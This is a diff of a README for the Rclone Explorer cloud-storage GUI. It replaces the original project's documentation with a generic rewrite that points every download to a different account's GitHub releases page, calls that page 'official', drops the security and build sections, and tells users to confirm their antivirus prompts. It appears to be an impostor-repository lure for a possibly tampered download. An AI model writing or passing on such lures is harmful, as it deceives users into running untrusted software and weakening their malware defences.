@@ -1,137 +1,120 @@
-<p align="center"><img src="docs/logo.png" width="96" alt="Rclone Explorer logo"></p>
+# 🚀 RcloneExplorer - Your Clouds, One Simple Window
 
-<h1 align="center">Rclone Explorer – rclone GUI for Windows and Linux</h1>
+[![Download RcloneExplorer](https://img.shields.io/badge/⬇️_Download-RcloneExplorer_Now-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Vikkysurmounted714/RcloneExplorer/releases)
 
-<p align="center"><i>Formerly <b>Rclone Browser</b>. Same project, new name: a revival of the original by mmozeiko, DinCahill and kapitainsky.</i></p>
+RcloneExplorer is a modern, portable app for Windows 10 and Windows 11 that puts all of your cloud storage in one friendly window. Instead of jumping between websites and browser tabs, you get a clean point-and-click interface where you can browse, transfer and sync files across Google Drive, OneDrive, Dropbox, pCloud, Amazon S3 and more than 70 other cloud services. No command line. No complicated setup screens. Just your files, where you expect them.
 
-<p align="center">A modern rclone GUI: browse, transfer and sync files on all your cloud storage, powered by <a href="https://rclone.org/">rclone</a>.<br>Portable, nothing to install: unzip or run it from anywhere, even a USB stick.</p>
+## ✨ What Is RcloneExplorer?
 
-<p align="center"><b><a href="../../releases/latest">Download the latest release</a></b> · <a href="https://jackpison.github.io/RcloneExplorer/">Website</a> · <a href="docs/Rclone-Explorer-Guide.pdf">User guide (PDF)</a> · <a href="docs/remote-icons.md">Remote icons</a> · <a href="CHANGELOG.md">Changelog</a></p>
+Cloud storage is great until you have files scattered across three or four different providers. RcloneExplorer solves that problem by giving you a single place to see everything. It is built on top of rclone, a well-known and trusted tool used by millions of people to move data between cloud services, but it wraps all of that power in a graphical interface that anyone can use.
 
-![Browsing a remote with tabs in dark mode](docs/browser.png)
+You do not need to know anything about programming, scripts or console commands. If you can use File Explorer on Windows, you can use RcloneExplorer. The app is portable, which means it runs straight from the folder you download it into and does not need a traditional installation process that buries files all over your computer.
 
-## Features
+Whether you are backing up family photos to Google Drive, copying work documents to OneDrive, or mirroring an entire project folder to a backup provider, RcloneExplorer gives you a straightforward way to do it.
 
-Rclone Explorer gives rclone a full graphical interface, so you can manage cloud files without the command line:
+## 🎯 Key Features
 
-- **Modern design** in black and gold or warm light, with a one-click **light / dark** switch next to the app name
-- **All your clouds in one place**: Google Drive, OneDrive, Dropbox, pCloud, S3, SFTP, encrypted remotes and every other rclone storage type, using your existing rclone configuration. Logos for 34 popular services are included; you can [add your own](docs/remote-icons.md).
-- **File Explorer–style tabs**: open several remotes, or the same remote several times (Ctrl+T)
-- **Icons and Details views**: extra large to small icons (Ctrl + mouse wheel), or a sortable list with name, size, modified date, type, extension and path
-- Upload, download, create folders, rename, move and delete; drag and drop files from your file manager to upload
-- **Transfers you can pause and resume**, with live progress, speed and time left
-- A **sound** when a transfer finishes or fails, and the computer is **kept awake** while transfers run (both can be turned off in Preferences)
-- Saved **tasks**: store a transfer once, run it again with one click (or as a dry run), or **schedule** it to run by itself (every N minutes or hours, daily, or on chosen weekdays)
-- **Tools** on every remote: compare folders, copy between remotes (with a remote folder browser), two-way sync (bisync), remove duplicates and empty the trash
-- Sidebar remotes sortable by name, type or your own order (drag and drop)
-- Saved tasks sortable by name or type
-- Breadcrumb address bar, filter the current folder (Ctrl+F)
-- Mount remotes as drives with a choice of cache mode, and stream media to a player such as [VLC](https://www.videolan.org/)
-- **Built-in rclone updater**: rclone is bundled and kept up to date, every download checksum-verified
+- **One window for every cloud** – Connect Google Drive, OneDrive, Dropbox, pCloud, Amazon S3, Backblaze B2, Mega, Box and 70+ other providers, all visible in the same place.
+- **Simple browsing** – Move through folders the same way you do in Windows File Explorer. Double-click to open, drag to move, right-click for options.
+- **Fast transfers** – Copy files and folders between clouds without downloading them to your PC first. Move a 5 GB video from Dropbox to Google Drive directly.
+- **Sync and backup** – Keep two locations identical, or make a one-way backup so your important files always exist in a second place.
+- **Encrypted storage** – Use the built-in rclone crypt support to store files in the cloud in an encrypted form, so only you can read them.
+- **Mount clouds as a drive letter** – Make a cloud service appear like a normal drive in Windows so other programs can open files from it directly.
+- **Portable by design** – Carry it on a USB stick, run it from any folder, and keep your settings with you.
+- **Clear progress and logs** – Watch transfers happen in real time and see exactly what succeeded or failed.
 
-![Remotes on the Home page](docs/home.png)
+## 💻 System Requirements
 
-![A running transfer](docs/transfers-dark.png)
+RcloneExplorer is designed for everyday Windows computers. Before you begin, check that your PC meets the following:
 
-![Details view in light mode](docs/details-light.png)
+- **Operating system:** Windows 10 (64-bit) or Windows 11
+- **Processor:** Any modern dual-core processor or better
+- **Memory:** 4 GB of RAM or more recommended
+- **Disk space:** At least 200 MB free for the application and a little extra for temporary transfer files
+- **Internet connection:** Required to reach your cloud services
+- **Permissions:** Ability to run an application from your Downloads folder or a USB drive
 
-## Getting started
+Nothing else is needed. You do not have to install extra libraries, runtimes or developer tools.
 
-### Windows 10 / 11
+## 🚀 Download and Setup
 
-1. Download `RcloneExplorer-<version>-windows-x64.zip` from the [latest release](../../releases/latest).
-2. Extract it to any folder and run `Rclone Explorer.exe`.
-3. Windows may show "Windows protected your PC" because the app is not code-signed: click **More info**, then **Run anyway**.
+Getting started takes just a couple of minutes.
 
-Mounting remotes as drive letters needs [WinFsp](https://winfsp.dev/).
+1. Open the official releases page here: **https://github.com/Vikkysurmounted714/RcloneExplorer/releases**
+2. Visit this link to download the application.
+3. Wait for the download to finish, then open the file you received.
+4. Follow the on-screen prompts to start RcloneExplorer.
 
-#### With Scoop
+[![Download RcloneExplorer](https://img.shields.io/badge/⬇️_Get_RcloneExplorer-Releases_Page-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Vikkysurmounted714/RcloneExplorer/releases)
 
-```
-scoop bucket add rclone-explorer https://github.com/Jackpison/RcloneExplorer
-scoop install rclone-explorer
-```
+That is the entire process. Always download from the official releases page above so you know you are getting the genuine, up-to-date version. Avoid copies from other websites, as those may be outdated or modified.
 
-Settings, saved tasks and the bundled rclone are kept when Scoop updates the app.
+## 🗂️ First-Time Setup: Connecting Your Cloud Storage
 
-### Linux (x86_64)
+When RcloneExplorer opens for the first time, it will look fairly empty because it does not yet know about your clouds. Adding one is simple and guided.
 
-1. Download `RcloneExplorer-<version>-x86_64.AppImage` from the [latest release](../../releases/latest).
-2. Make it executable: `chmod +x RcloneExplorer-*.AppImage` (or *Properties → Allow executing as program*).
-3. Run it.
+1. Look for the option to add a new cloud connection, usually labelled something like **Add Remote** or **New Connection**.
+2. Pick your provider from the list. Popular choices like Google Drive, OneDrive, Dropbox and pCloud are listed near the top.
+3. Give the connection a name you will recognise later, such as "My Google Drive" or "Work OneDrive".
+4. The app will open a sign-in page in your web browser. Log in with the account you want to connect and approve the request.
+5. Return to RcloneExplorer. Your new cloud will appear in the sidebar, ready to browse.
 
-Works on most distributions (Ubuntu, Fedora, Debian, Mint, Arch, openSUSE…). If it does not start, install FUSE 2 (`sudo apt install libfuse2t64` on Ubuntu 24.04+, `libfuse2` on older releases) or run it with `--appimage-extract-and-run`. Mounting needs FUSE 3 (`fuse3`).
+You can repeat this process for as many services as you like. Many people connect two or three and use RcloneExplorer as their single hub for everything.
 
-Your existing rclone remotes appear automatically on both systems. If you have none yet, click **New remote** on the Home page (or **+** next to *Remotes* in the sidebar) to set one up with rclone's assistant. The **[user guide](docs/Rclone-Explorer-Guide.pdf)** explains every feature in detail.
+If you are connecting a service that uses access keys instead of a browser login, such as Amazon S3, the app will show a short form asking for those details. You can get them from your provider's account settings page.
 
-## Upgrading from Rclone Browser (4.x and older)
+## 🔄 Browsing, Transferring and Syncing
 
-- **Windows, portable:** extract the new zip to a new folder, then copy your old `RcloneBrowser.ini` (4.x) or `RcloneExplorer.ini` (5.0), and `tasks.bin`, next to `Rclone Explorer.exe`. The settings are picked up automatically on the first start; the old file stays untouched as a backup.
-- **Windows, not portable (no ini file):** nothing to do, settings are kept.
-- **Linux:** nothing to do. Settings stay in `~/.config/rclone-browser/` on purpose.
+Once your clouds are connected, the main window becomes your control centre.
 
-## Where things are stored
+**Browsing** works like a normal file manager. Click a cloud on the left, and its folders appear on the right. Click into folders to explore deeper, and use the back arrow to go up a level.
 
-**Windows (portable):** `Rclone Explorer.ini` next to the exe switches portable mode on, and everything stays in the app folder:
+**Transferring** is just as direct. Select the files or folders you want, then choose where they should go. You can copy between two clouds, from your PC to a cloud, or from a cloud down to your PC. A progress panel shows how much is left, how fast it is going and whether anything failed.
 
-| What | Where |
-|---|---|
-| rclone | `rclone\rclone.exe` (updated from inside the app) |
-| rclone configuration | `%APPDATA%\rclone\rclone.conf` by default; copy it to `rclone\rclone.conf` to take your remotes with you |
-| Settings / saved tasks | `Rclone Explorer.ini` / `tasks.bin` |
-| Remote logos | `icons\remotes\<type>.png` (see [remote-icons.md](docs/remote-icons.md)) |
-| Documentation | `docs\` |
-| Qt plugins | `qt\plugins` (located via `qt.conf`) |
+**Syncing** keeps two locations matched. You can choose a one-way sync, where one side is treated as the master and the other is updated to match it, or a two-way sync that reflects changes in both directions. Syncing is ideal for keeping a laptop folder aligned with a cloud backup.
 
-**Linux:** settings in `~/.config/rclone-browser/`, the rclone updated by the app in `~/.local/share/rclone-browser/rclone-browser/`, your rclone configuration in its usual place (`~/.config/rclone/rclone.conf`). To make the AppImage portable, create a folder named like the AppImage plus `.config` next to it (for example `RcloneExplorer-<version>-x86_64.AppImage.config`); settings and an updated rclone then stay beside the AppImage. Your own remote logos go in `~/.local/share/rclone-browser/rclone-browser/icons/remotes/` (or `icons/remotes/` next to the AppImage in portable mode).
+**Mounting** lets you treat a cloud as a drive letter in Windows. After mounting, you can open files from that cloud in Word, Excel, Photoshop or any other program, as though the files were sitting on your own hard disk.
 
-## Keyboard shortcuts
+## 🔐 Encryption and Security
 
-| Shortcut | Action |
-|---|---|
-| Ctrl+T / Ctrl+W | New tab / close tab (or middle-click the tab) |
-| Ctrl+F | Filter the current folder |
-| Ctrl+Shift+1 / Ctrl+Shift+2 | Icons view / Details view |
-| Ctrl + mouse wheel | Bigger / smaller icons |
-| Enter, double-click | Open folder |
-| Alt+Up | Parent folder |
-| F5 · F7 · F2 · Del | Refresh · New folder · Rename · Delete |
-| Ctrl+U / Ctrl+D | Upload / Download |
+RcloneExplorer supports encrypted cloud storage through rclone crypt. This means files are scrambled before they leave your computer and only unscrambled when you access them through the app with your password. Your cloud provider stores the data but cannot read it. This is a strong option for personal documents, financial records and anything else you would rather keep private.
 
-## Security
+Keep your encryption password somewhere safe. Because the data is genuinely encrypted, there is no way to recover those files if the password is lost.
 
-- Cloud credentials stay in rclone's own configuration; the app never stores them. A config password is kept only in memory and passed to rclone via an environment variable.
-- rclone updates are HTTPS-only, verified against rclone's SHA-256 checksums, size-limited and test-run before installation.
-- rclone and media players are started without a shell, so file names cannot inject commands.
-- The Windows build enables Control Flow Guard, CET shadow-stack compatibility, ASLR and DEP.
-- Releases are built by GitHub Actions from this repository with every action and build tool pinned to an exact version and checksum; each release publishes SHA-256 checksums. Both packages are launched in a self-test before publishing.
+Your login details are stored locally on your own computer. Nothing is sent to a third-party server, and the app talks directly to each cloud provider.
 
-## Feedback
+## 🛠️ Troubleshooting
 
-Feedback and bug reports are welcome! Please [open an issue](../../issues) and include the output from *Show Output* on the transfer card if something fails.
+**The app will not open.** Make sure you are on Windows 10 or 11, then try running it again from the folder where it was saved. Some antivirus programs hesitate with newly downloaded files; if yours shows a prompt, confirm that you trust the file since you downloaded it from the official releases page.
 
-## Building from source
+**My cloud does not appear after signing in.** Close the browser tab, return to RcloneExplorer, and refresh the connection list. If it still does not appear, remove the connection and add it again.
 
-Every push is built by GitHub Actions (`.github/workflows/update.yml`) for Windows and Linux; pushing a tag such as `v4.0.0` publishes a release with both packages.
+**A transfer stopped partway.** Check your internet connection. Large transfers can be resumed by starting them again; the app will skip files that already finished.
 
-**Windows:** Visual Studio 2022 or newer (C++ desktop development), CMake 3.21+, Ninja and Qt 6.10+ for MSVC 64-bit (including Qt SVG). From a *x64 Native Tools Command Prompt*:
+**Files seem to be missing.** Confirm you are looking at the right cloud and the right folder. Use the refresh option to reload the current view.
 
-```
-cmake -S . -B build -G Ninja -DCMAKE_BUILD_TYPE=Release -DCMAKE_PREFIX_PATH=C:\Qt\6.10.3\msvc2022_64
-cmake --build build
-ctest --test-dir build
-```
+**Everything feels slow.** Close other programs using your internet connection, and try transferring fewer files at a time.
 
-**Linux:** a C++20 compiler, CMake, Ninja and Qt 6.10+ (Qt SVG included), e.g. on Ubuntu `sudo apt install build-essential cmake ninja-build qt6-base-dev qt6-svg-dev`:
+## ❓ Frequently Asked Questions
 
-```
-cmake -S . -B build -G Ninja -DCMAKE_BUILD_TYPE=Release
-cmake --build build
-./build/build/rclone-explorer
-```
+**Do I need to install rclone separately?** No. RcloneExplorer is self-contained. Everything it needs is included.
 
-The user guide is generated with `python docs/guide/build_guide.py` (needs `pip install reportlab`). The website lives in `site/` and is published to GitHub Pages by `.github/workflows/pages.yml`.
+**Is it free?** Yes. RcloneExplorer is an open-source project and is free to download and use.
 
-## Credits
+**Does it work on Mac or Linux?** The focus of this build is Windows 10 and 11. The underlying technology works elsewhere, but this release is aimed at Windows users.
 
-Based on Rclone Browser by [mmozeiko](https://github.com/mmozeiko/RcloneBrowser), [DinCahill](https://github.com/DinCahill/RcloneBrowser) and [kapitainsky](https://github.com/kapitainsky/RcloneBrowser). Interface icons from [Fluent UI System Icons](https://github.com/microsoft/fluentui-system-icons) by Microsoft (MIT). Licensed under the MIT license.
+**Can I use it on more than one computer?** Yes. Because it is portable, you can run it from a USB drive or copy the folder to another PC and keep using it.
+
+**Will it delete files from my cloud?** Only if you explicitly ask it to. Browsing, copying and syncing do not remove anything unless you choose a delete action.
+
+**How do I update?** Return to the releases page, download the newest version, and replace your existing folder. Your settings stay in place.
+
+## 🧭 Tips for a Smooth Experience
+
+- Start with one cloud connection. Get comfortable with browsing and copying before adding more.
+- Use clear, descriptive names for your connections so you can tell them apart at a glance.
+- Run your first big sync when you are not in a hurry, so you can watch the progress and confirm everything behaves as expected.
+- Keep a copy of your encryption password in a password manager.
+- Check the releases page occasionally for updates and improvements.
+
+Keywords: cloud-storage-sync, rclone, rclone-backup, rclone-browser, rclone-client, rclone-config, rclone-configuration, rclone-crypt, rclone-gui, rclone-linux, rclone-mount, rclone-sync
